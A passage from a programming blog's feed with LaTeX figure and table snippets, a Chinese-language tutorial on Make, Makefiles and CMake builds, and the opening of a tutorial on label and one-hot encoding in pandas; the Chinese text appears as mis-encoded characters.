class="line">    <span class="keyword">\subfigure</span>[name2]&#123;</span><br><span class="line">        <span class="keyword">\centering</span>  <span class="comment">%å›¾ç‰‡å…¨å±€å±…ä¸­</span></span><br><span class="line">        <span class="keyword">\label</span>&#123;Fig.sub.2&#125;</span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=0.33<span class="keyword">\textwidth</span>]&#123;pic/communication<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">\subfigure</span>[name3]&#123;</span><br><span class="line">        <span class="keyword">\centering</span>  <span class="comment">%å›¾ç‰‡å…¨å±€å±…ä¸­</span></span><br><span class="line">        <span class="keyword">\label</span>&#123;Fig.sub.3&#125;</span><br><span class="line">        <span class="keyword">\includegraphics</span>[width=0.33<span class="keyword">\textwidth</span>]&#123;pic/communication<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">\caption</span>&#123;Main name&#125;</span><br><span class="line">    <span class="keyword">\label</span>&#123;Fig.main&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;figure*&#125;</span><br></pre></td></tr></table></figure><p>æ— æ ‡é¢˜</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;figure*&#125;</span><br><span class="line">    <span class="keyword">\centering</span></span><br><span class="line">    <span class="keyword">\includegraphics</span>[width=0.32<span class="keyword">\textwidth</span>]&#123;pic/computation<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    <span class="keyword">\includegraphics</span>[width=0.33<span class="keyword">\textwidth</span>]&#123;pic/communication<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    <span class="keyword">\includegraphics</span>[width=0.33<span class="keyword">\textwidth</span>]&#123;pic/communication<span class="built_in">_</span>cost.png&#125;</span><br><span class="line">    <span class="keyword">\caption</span>&#123;This is a picture.&#125;</span><br><span class="line">    <span class="keyword">\label</span>&#123;fig:&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;figure*&#125;</span><br></pre></td></tr></table></figure><p>æ•°ç»„ä¸è¡¨æ ¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$$\begin&#123;array&#125;&#123;|l|l|&#125; % control positon left center right(l c r), &#x27;|&#x27; control border</span><br><span class="line">        \hline                                &amp; \text &#123;No Attack, Attacks&#125; \\</span><br><span class="line">        \hline \text &#123; Krum &#125;                 &amp; 0.14, 0.72, 0.13           \\</span><br><span class="line">        \hline \text &#123; Krum + ERR &#125;           &amp; 0.14, 0.62, 0.13           \\</span><br><span class="line">        \hline \text &#123; Krum + LFR &#125;           &amp; 0.14, 0.58, 0.14           \\</span><br><span class="line">        \hline \text &#123; Krum + Union &#125;         &amp; 0.14, 0.48, 0.14           \\</span><br><span class="line">        \hline \hline \text &#123; Trimmed mean &#125;  &amp; 0.12, 0.15, 0.23           \\</span><br><span class="line">        \hline \text &#123; Trimmed mean + ERR &#125;   &amp; 0.12, 0.17, 0.21           \\</span><br><span class="line">        \hline \text &#123; Trimmed mean + LFR &#125;   &amp; 0.12, 0.18, 0.12           \\</span><br><span class="line">        \hline \text &#123; Trimmed mean + Union &#125; &amp; 0.12, 0.18, 0.12           \\</span><br><span class="line">        \hline \hline \text &#123; Median &#125;        &amp; 0.13, 0.17, 0.19           \\</span><br><span class="line">        \hline \text &#123; Median + ERR &#125;         &amp; 0.13, 0.21, 0.25           \\</span><br><span class="line">        \hline \text &#123; Median + LFR &#125;         &amp; 0.13, 0.20, 0.13           \\</span><br><span class="line">        \hline \text &#123; Median + Union &#125;       &amp; 0.13, 0.19, 0.14           \\</span><br><span class="line">        \hline</span><br><span class="line">    \end&#123;array&#125;</span><br><span class="line">$$</span><br><span class="line">\begin&#123;center&#125;</span><br><span class="line">    Table 1: Defense, in Depth</span><br><span class="line">\end&#123;center&#125;</span><br><span class="line">``</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> latex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMake å’Œ Make ç¼–è¯‘</title>
      <link href="/blog/2022/05/20/programming/c++/cmake_make/"/>
      <url>/blog/2022/05/20/programming/c++/cmake_make/</url>
      
        <content type="html"><![CDATA[<h2 id="make-ä¸-makefile">Make ä¸ MakeFile</h2><p>makefile æ–‡ä»¶ä½¿ä»£ç ç¼–è¯‘æ›´åŠ ä¾¿æ·é«˜æ•ˆ, make ç¨‹åºè§£æ makefileæ–‡ä»¶çš„æŒ‡ä»¤ï¼Œè¿›è¡Œç¼–è¯‘å’Œé“¾æ¥ç¨‹åºã€‚</p><p>makefile ä¼˜ç‚¹ï¼š</p><ol type="1"><li><p>å¦‚æœè¿™ä¸ªå·¥ç¨‹æ²¡æœ‰ç¼–è¯‘è¿‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æ‰€æœ‰ cæ–‡ä»¶éƒ½è¦ç¼–è¯‘å¹¶è¢«é“¾æ¥ã€‚</p></li><li><p>å¦‚æœè¿™ä¸ªå·¥ç¨‹çš„æŸå‡ ä¸ª c æ–‡ä»¶è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªç¼–è¯‘è¢«ä¿®æ”¹çš„ cæ–‡ä»¶ï¼Œå¹¶é“¾æ¥ç›®æ ‡ç¨‹åºã€‚</p></li><li><p>å¦‚æœè¿™ä¸ªå·¥ç¨‹çš„å¤´æ–‡ä»¶è¢«æ”¹å˜äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦ç¼–è¯‘å¼•ç”¨äº†è¿™å‡ ä¸ªå¤´æ–‡ä»¶çš„c æ–‡ä»¶ï¼Œå¹¶é“¾æ¥ç›®æ ‡ç¨‹åºã€‚</p></li><li><p>ç¼–è¯‘å‘½ä»¤å¤æ‚ï¼Œä¾‹å¦‚ï¼š<code>gcc -o hellomake hellomake.c hellofunc.c -I.</code></p><ol type="1"><li>èŠ‚çœé‡å¤ç¼–è¯‘æ—¶ï¼Œé‡æ–°è¾“å…¥ç¼–è¯‘å‘½ä»¤æ‰€éœ€çš„æ—¶é—´ï¼Œå°¤å…¶æ˜¯è¦ç¼–è¯‘çš„æºæ–‡ä»¶å¾ˆå¤šæ—¶ã€‚</li><li>å¦‚æœç¼–è¯‘å‘½ä»¤ä¸¢å¤±äº†ï¼Œä½ å°±éœ€è¦é‡æ–°è¾“å…¥</li></ol></li></ol><p>MakeFile çš„å‡ ä¸ªå¸¸ç”¨å…³é”®å­—æ®µä¸çŸ¥è¯†ï¼š</p><ol type="1"><li><p>Makefile æ–‡ä»¶åé»˜è®¤çš„æƒ…å†µä¸‹ï¼Œmakeå‘½ä»¤ä¼šåœ¨å½“å‰ç›®å½•ä¸‹æŒ‰é¡ºåºæ‰¾å¯»æ–‡ä»¶åä¸ºâ€œGNUmakefileâ€ã€â€œmakefileâ€ã€â€œMakefileâ€çš„æ–‡ä»¶ï¼Œå»ºè®®ä¼˜å…ˆä½¿ç”¨â€œMakefileâ€æ–‡ä»¶åã€‚</p><p>ä¹Ÿå¯ç”¨åˆ«çš„æ–‡ä»¶åæ¥ä¹¦å†™ Makefileï¼Œæ¯”å¦‚ CMake ç”Ÿæˆçš„ Makefile ä¸€èˆ¬ä¸ºxxx.makeï¼Œæ³¨æ„ï¼šè¦æŒ‡å®šéé»˜è®¤çš„ Makefileï¼Œä½¿ç”¨ make çš„â€œ-fâ€å’Œâ€œ--fileâ€å‚æ•°ï¼Œä¸€èˆ¬å¦‚ä¸‹ï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make -f ./Makefile ./build</span><br><span class="line">make -f ./build.make ./build</span><br></pre></td></tr></table></figure></p></li><li><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œmake è§£æ Makefile ä¸­ç¬¬ä¸€ä¸ªä¸ä»¥ <code>.</code> å¼€å¤´çš„target ä½œä¸ºé»˜è®¤ç¼–è¯‘ç›®æ ‡</p><p>ä¾‹å¦‚ï¼š</p><p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.DEFAULT_GOAL := mytarget</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: default</span></span><br><span class="line"><span class="section">default: mytarget ;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–</span></span><br><span class="line"><span class="section">default_target: all</span></span><br><span class="line">.PHONY : default_target</span><br></pre></td></tr></table></figure></p></li></ol><p>å¯¹äºä¸€ä¸ª C/C++ é¡¹ç›®ï¼Œä¸€èˆ¬æœ‰ç€ä¸ä¸‹é¢ç±»ä¼¼çš„ç›®å½•ç»“æ„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ build</span><br><span class="line">â”‚   â”œâ”€â”€ a.o</span><br><span class="line">â”‚   â”œâ”€â”€ b.o</span><br><span class="line">â”‚   â””â”€â”€ ...</span><br><span class="line">â”œâ”€â”€ include</span><br><span class="line">â”‚   â”œâ”€â”€ a.h</span><br><span class="line">â”‚   â””â”€â”€ b.h</span><br><span class="line">â”œâ”€â”€ depends</span><br><span class="line">â”‚   â”œâ”€â”€ lib1</span><br><span class="line">â”‚   â”œâ”€â”€ lib12</span><br><span class="line">â”‚   â””â”€â”€ ...</span><br><span class="line">â”œâ”€â”€ src</span><br><span class="line">â”‚   â”œâ”€â”€ a.c</span><br><span class="line">â”‚   â”œâ”€â”€ b.c</span><br><span class="line">â”‚   â””â”€â”€ ...</span><br><span class="line">â”œâ”€â”€ Makefile</span><br><span class="line">â””â”€â”€ test</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œtest æ˜¯æœ€åç”Ÿæˆçš„å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œincludeæ˜¯å¤´æ–‡ä»¶å­˜æ”¾çš„ç›®å½•ï¼Œsrc å­˜æ”¾æºæ–‡ä»¶ï¼Œbuild å­˜æ”¾ç›®æ ‡æ–‡ä»¶ï¼Œdependå­˜æ”¾ä¾èµ–çš„åº“ï¼ŒæŒ‰ç…§æƒ¯ä¾‹ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šå°† Makefile æ”¾åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹ã€‚</p><p>ä¸€èˆ¬å°†æ‰€æœ‰ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶è¾“å‡ºåˆ° buildç›®å½•ä¸‹ï¼Œè¿™æ ·ç›®å½•å°±æ¯”è¾ƒå¹²å‡€ï¼Œå½“ç„¶ä¹Ÿä¸ä¹å°†æœ€åçš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ç”Ÿæˆåœ¨build ä¸‹çš„ï¼Œå…·ä½“çœ‹ MakeFile å¦‚ä½•æŒ‡å®šã€‚</p><h2 id="make">make</h2><p>make å¸¸è§ç”¨æ³•ä¸‰ç§ï¼š</p><ol type="1"><li><code>make</code> å¯»æ‰¾é»˜è®¤çš„ Makefile è¿›è¡Œç¼–è¯‘ï¼Œå¯é€šè¿‡<code>-f</code> æŒ‡å®š MakeFile</li><li><code>make install</code> æ˜¯ç¼–è¯‘å¹¶å®‰è£…</li><li><code>make clean</code> ç”¨æ¥æ¸…é™¤æ‰€æœ‰çš„ç›®æ ‡æ–‡ä»¶ï¼Œä»¥ä¾¿é‡ç¼–è¯‘ã€‚</li></ol><p>linux ç¼–è¯‘å®‰è£…è½¯ä»¶çš„æµç¨‹å¦‚ä¸‹ï¼Œå¦‚æœç¼–è¯‘é¡¹ç›®åˆ™ä¸æ‰§è¡Œ<code>make install</code> å®‰è£…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>configureã€make å’Œ make install ä½œç”¨å¦‚ä¸‹ï¼š</p><ol type="1"><li>./configureæ˜¯ç”¨æ¥æ£€æµ‹ä½ çš„å®‰è£…å¹³å°çš„ç›®æ ‡ç‰¹å¾çš„ã€‚æ¯”å¦‚å®ƒä¼šæ£€æµ‹ä½ æ˜¯ä¸æ˜¯æœ‰ CC æˆ–GCCï¼Œå¹¶ä¸æ˜¯éœ€è¦ CC æˆ– GCCï¼Œå®ƒæ˜¯ä¸ª shell è„šæœ¬ã€‚</li><li>make æ˜¯ç”¨æ¥ç¼–è¯‘çš„ï¼Œå®ƒä» Makefile ä¸­è¯»å–æŒ‡ä»¤ï¼Œç„¶åç¼–è¯‘ã€‚</li><li>make install æ˜¯ç”¨æ¥å®‰è£…çš„ï¼ˆä¾‹å¦‚æŠŠ C++ åº“ç¼–è¯‘å®‰è£…åˆ°ç³»ç»Ÿç›®å½•ï¼‰ï¼Œå®ƒä¹Ÿä»Makefile ä¸­è¯»å–æŒ‡ä»¤ï¼Œå®‰è£…åˆ°æŒ‡å®šçš„ä½ç½®ã€‚</li></ol><h2 id="cmake">CMake</h2><p>ä¸åŒå¹³å°ï¼ˆlinuxã€Windowsã€MacOSï¼‰çš„ç¼–è¯‘ç¯å¢ƒæ˜¯æœ‰å·®å¼‚çš„ï¼Œä¸ºäº†åº”å¯¹è¿™ç§å·®å¼‚ï¼Œå„å¹³å°ç¼–è¯‘æ‰€éœ€çš„MakeFile æ–‡ä»¶ä¹Ÿå„ä¸ç›¸åŒã€‚è€Œ cmakeï¼Œä½œä¸ºä¸€ä¸ªä¸€ä¸ªè·¨å¹³å°çš„å®‰è£…ï¼ˆç¼–è¯‘ï¼‰å·¥å…·ï¼Œå®ƒæŠ½è±¡äº†ä¸€å¥—ä¸Šå±‚çš„ç¼–è¯‘é…ç½®è¯­æ³•ï¼Œå¹¶è´Ÿè´£äº†å°†Ta é’ˆå¯¹å¹³å°è¿›è¡Œ MakeFile æ–‡ä»¶è§£é‡Šçš„ä»»åŠ¡ã€‚</p><p>CMake å®šä¹‰äº†ä¸€å¥—è¯­æ³•æ¥ç»„ç»‡ CMakeLists.txt æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ cmakeå‘½ä»¤å¯ä»¥ç»“åˆ CMakeLists.txt æ–‡ä»¶çš„â€é…ç½®â€œç”Ÿæˆ MakeFileï¼Œç„¶åäº¤ç»™ makeè§£æ</p><h3 id="å¤–éƒ¨æ„å»º">å¤–éƒ¨æ„å»º</h3><p>CMakeå¯ä»¥å°†å°†æ‰€æœ‰çš„ç¼–è¯‘ä¿¡æ¯æœ‰æ•ˆåœ°ç®¡ç†åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼å½“æˆ‘ä»¬æƒ³æ¸…ç†ç¼–è¯‘æ•°æ®æ—¶ï¼Œåªéœ€è¦åˆ é™¤build æ–‡ä»¶å¤¹ã€‚å…¶ç”Ÿæˆçš„ MakeFile ä¸­çš„å˜é‡ CMAKE_BINARY_DIR æŒ‡å‘ cmakeå‘½ä»¤çš„æ ¹æ–‡ä»¶å¤¹ï¼Œæ‰€æœ‰äºŒè¿›åˆ¶æ–‡ä»¶åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œäº§ç”Ÿï¼Œä¸€èˆ¬å¯ä»¥åœ¨ CMakeä¹‹åæŸ¥çœ‹ï¼Œç¡®å®šäºŒè¿›åˆ¶æ–‡ä»¶çš„ä½ç½®ã€‚</p><p>å¤–éƒ¨æ„å»ºå¸¸è§„æ­¥éª¤ï¼šåˆ›å»º build æ–‡ä»¶å¤¹ï¼Œç„¶åè¿›å…¥è¯¥æ–‡ä»¶å¤¹ï¼Œé€šè¿‡ä¸º cmakeæŒ‡å®šä¸Šå±‚ç›®å½•å¯»æ‰¾ CMakeLists.txt, å°†ç¼–è¯‘æ–‡ä»¶ç”Ÿæˆåœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build/</span><br><span class="line">cmake ..</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æ–‡ä»¶æ ‘å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ build</span><br><span class="line">â”‚   â”œâ”€â”€ CMakeCache.txt</span><br><span class="line">â”‚   â”œâ”€â”€ CMakeFiles</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ 2.8.12.2</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ CMakeCCompiler.cmake</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ CMakeCXXCompiler.cmake</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ CMakeDetermineCompilerABI_C.bin</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ CMakeDetermineCompilerABI_CXX.bin</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ CMakeSystem.cmake</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ CompilerIdC</span><br><span class="line">â”‚   â”‚   â”‚   â”‚   â”œâ”€â”€ a.out</span><br><span class="line">â”‚   â”‚   â”‚   â”‚   â””â”€â”€ CMakeCCompilerId.c</span><br><span class="line">â”‚   â”‚   â”‚   â””â”€â”€ CompilerIdCXX</span><br><span class="line">â”‚   â”‚   â”‚       â”œâ”€â”€ a.out</span><br><span class="line">â”‚   â”‚   â”‚       â””â”€â”€ CMakeCXXCompilerId.cpp</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ cmake.check_cache</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ CMakeDirectoryInformation.cmake</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ CMakeOutput.log</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ CMakeTmp</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ hello_cmake.dir</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ build.make</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ cmake_clean.cmake</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ DependInfo.cmake</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ depend.make</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ flags.make</span><br><span class="line">â”‚   â”‚   â”‚   â”œâ”€â”€ link.txt</span><br><span class="line">â”‚   â”‚   â”‚   â””â”€â”€ progress.make</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ Makefile2</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ Makefile.cmake</span><br><span class="line">â”‚   â”‚   â”œâ”€â”€ progress.marks</span><br><span class="line">â”‚   â”‚   â””â”€â”€ TargetDirectories.txt</span><br><span class="line">â”‚   â”œâ”€â”€ cmake_install.cmake</span><br><span class="line">â”‚   â””â”€â”€ Makefile</span><br><span class="line">â”œâ”€â”€ CMakeLists.txt</span><br><span class="line">â”œâ”€â”€ main.cpp</span><br></pre></td></tr></table></figure><p>build æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆäº†è®¸å¤šäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¦‚æœè¦ä»å¤´å¼€å§‹é‡æ–°åˆ›å»º cmakeç¯å¢ƒï¼Œåªéœ€åˆ é™¤æ„å»ºç›®å½• buildï¼Œç„¶åé‡æ–°è¿è¡Œ cmake å³å¯ã€‚</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://seisman.github.io/how-to-write-makefile/introduction.html">makefileä»‹ç» â€” è·Ÿæˆ‘ä¸€èµ·å†™ Makefile 1.0 æ–‡æ¡£</a></li><li><ahref="https://stackoverflow.com/questions/2057689/how-does-make-app-know-default-target-to-build-if-no-target-is-specified">makefile- How does "make" app know default target to build if no target isspecified? - Stack Overflow</a></li><li><ahref="https://www.linuxidc.com/Linux/2019-08/160139.htm#:~:text=%E7%AE%80%E5%8D%95%E6%9D%A5%E8%AF%B4%EF%BC%8Cmake%20%E6%98%AF%E7%BC%96%E8%AF%91%EF%BC%8Cmake%20install%20%E6%98%AF%E5%AE%89%E8%A3%85%E3%80%82">makeå’Œ make install çš„åŒºåˆ«_Linux æ•™ç¨‹_Linux å…¬ç¤¾-Linux ç³»ç»Ÿé—¨æˆ·ç½‘ç«™</a></li><li><a href="https://www.jianshu.com/p/5c9ffb3506c0">æƒ³ç©å„¿ githubå¼€æºï¼Œæ€èƒ½å¯¹ makeã€cmake ä¸€çŸ¥åŠè§£ï¼Ÿ - ç®€ä¹¦</a></li><li><ahref="https://xkun.me/2021/09/02/Makefile%E5%B0%86%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95/">Makefileå°†ç›®æ ‡æ–‡ä»¶è¾“å‡ºåˆ°æŒ‡å®šç›®å½• | Snow's Blog</a></li><li><ahref="https://sfumecjf.github.io/cmake-examples-Chinese/01-basic/1.1%20%20hello-cmake.html">1.1hello-CMake Â· GitBook</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> cplusplus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMake </tag>
            
            <tag> Make </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Categorical encoding:Label-Encoding and One-Hot-Encoder</title>
      <link href="/blog/2022/05/19/ml/categorical_encoding/"/>
      <url>/blog/2022/05/19/ml/categorical_encoding/</url>
      
        <content type="html"><![CDATA[<p>åœ¨æœºå™¨å­¦ä¹ æˆ–å¤§æ•°æ®ä¸­ï¼Œæ•°æ®é›†å¯èƒ½åŒ…å«æ–‡æœ¬æˆ–ç±»åˆ«å€¼(categorical values),åŸºæœ¬ä¸Šæ˜¯éæ•°å€¼å€¼ (non-numerical values), ä¾‹å¦‚ï¼šé¢œè‰²ï¼šred, orange, blue,white ç­‰ã€é¥®é£Ÿï¼šbreakfast, lunch, snacks, dinner, teaã€‚ä¸€äº›ç®—æ³•ï¼Œæ¯”å¦‚CATBOASTï¼Œdecision-trees å¯ä»¥å¾ˆå¥½åœ°å¤„ç†ç±»åˆ«å€¼ï¼ˆcategoricalvaluesï¼‰ï¼Œä½†å¤§å¤šæ•°ç®—æ³•æ›´åå‘ä½¿ç”¨æ•°å€¼ï¼Œå®ƒä»¬åœ¨æ•°å€¼è¾“å…¥æ—¶æ›´å®¹æ˜“è·å¾—state-of-the-artresultsã€‚å› æ­¤æˆ‘ä»¬éœ€è¦å°†æ–‡æœ¬/ç±»åˆ«æ•°æ®è½¬æ¢ä¸ºæ•°å€¼æ•°æ®ï¼Œå¹¶ä»ç„¶ä½¿ç®—æ³•/æ¨¡å‹ä»å…¶ä¸­ä¹ å¾—å«ä¹‰ã€‚</p><p>æœ‰è®¸å¤šå°†åˆ†ç±»å€¼è½¬æ¢ä¸ºæ•°å€¼çš„æ–¹æ³•ï¼Œæ¯ç§æ–¹æ³•éƒ½æœ‰å…¶ä¼˜ç¼ºç‚¹ã€‚æœ¬æ–‡ä¸»è¦ä»‹ç»ä¸¤ç§ä¸»æµçš„ç¼–ç æ–¹æ¡ˆ:One-Hot-Encoding and Label-Encoding. è¿™ä¸¤ç§ç¼–ç éƒ½å¯ç”¨ pandas æˆ–SciKit-learn å®ç°ã€‚</p><h2 id="label-encoding">Label Encoding</h2><p>å°†æ¯ä¸ªç±»åˆ«è½¬åŒ–ä¸ºä¸€ä¸ªæ•°å­— å¯¹å¦‚ä¸‹ç±»åˆ«å€¼è¿›è¡Œ Label Encodingç¼–ç å¦‚ä¸‹ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BRIDGE-TYPE</span><br><span class="line">Arch</span><br><span class="line">Beam</span><br><span class="line">Truss</span><br><span class="line">Cantilever</span><br><span class="line">Tied Arch</span><br><span class="line">Suspension</span><br><span class="line">Cable</span><br></pre></td></tr></table></figure><p>Label Encoding: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220501230259.png"alt="20220501230259" /></p><h3 id="é—®é¢˜ä¸å±€é™">é—®é¢˜ä¸å±€é™</h3><p>ç”±äº Label Encodingä½¿ç”¨æ•°å­—åºåˆ—ç¼–ç ï¼Œå¯¼è‡´å…¶åœ¨åŸå§‹æ•°æ®ä¹‹é—´å¼•å…¥äº†å…³è”/æ¯”è¾ƒã€‚å¾ˆæ˜æ˜¾åœ¨æ¡¥çš„ç±»å‹æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚ä½†æ˜¯ä»ç¼–ç è§’åº¦çœ‹ï¼Œå¯èƒ½ä¼šè®¤ä¸ºTruess æ¯” Archä¼˜å…ˆçº§/æ¬¡åºé«˜ã€‚è¯¥ç®—æ³•å¯èƒ½ä¼šè¯¯è§£æ•°æ®å…·æœ‰æŸç§å±‚æ¬¡ç»“æ„/æ¬¡åº:0 &lt;1&lt;2â€¦&lt;6ï¼Œå¹¶ä¸”å¯èƒ½å¯¹ Truess ç»™äºˆå¤šäºå…­å€çš„ Arch çš„æƒé‡</p><p>è€Œæœ‰äº›ç±»åˆ«ï¼Œè¯¸å¦‚ï¼šSafety Levelè¿™ç±»å…·å¤‡ä¼˜å…ˆçº§/æ¬¡åºçš„ç±»åˆ«å€¼ï¼Œå°±å¯ä»¥ä½¿ç”¨ Labelencodingï¼Œæ¥æ ‡è¯†å‡ºå…¶å…³ç³»ã€‚å¦‚æœç®—æ³•å°† Safety Level ç¼–ç è§£é‡Šä¸º: 0 &lt; 1&lt; 2 &lt; 3 &lt; 4ï¼Œå³ none &lt; low &lt; medium &lt; high &lt; veryhigh, ä¾¿æ˜¯æœ‰æ„ä¹‰çš„ã€‚</p><p>none &lt; low &lt; medium &lt; high &lt; very high</p><h3 id="label-encoding-in-python">Label Encoding in Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import required libraries</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># creating initial dataframe</span></span><br><span class="line">bridge_types = (<span class="string">&#x27;Arch&#x27;</span>,<span class="string">&#x27;Beam&#x27;</span>,<span class="string">&#x27;Truss&#x27;</span>,<span class="string">&#x27;Cantilever&#x27;</span>,<span class="string">&#x27;Tied Arch&#x27;</span>,<span class="string">&#x27;Suspension&#x27;</span>,<span class="string">&#x27;Cable&#x27;</span>)</span><br><span class="line">bridge_df = pd.DataFrame(bridge_types, columns=[<span 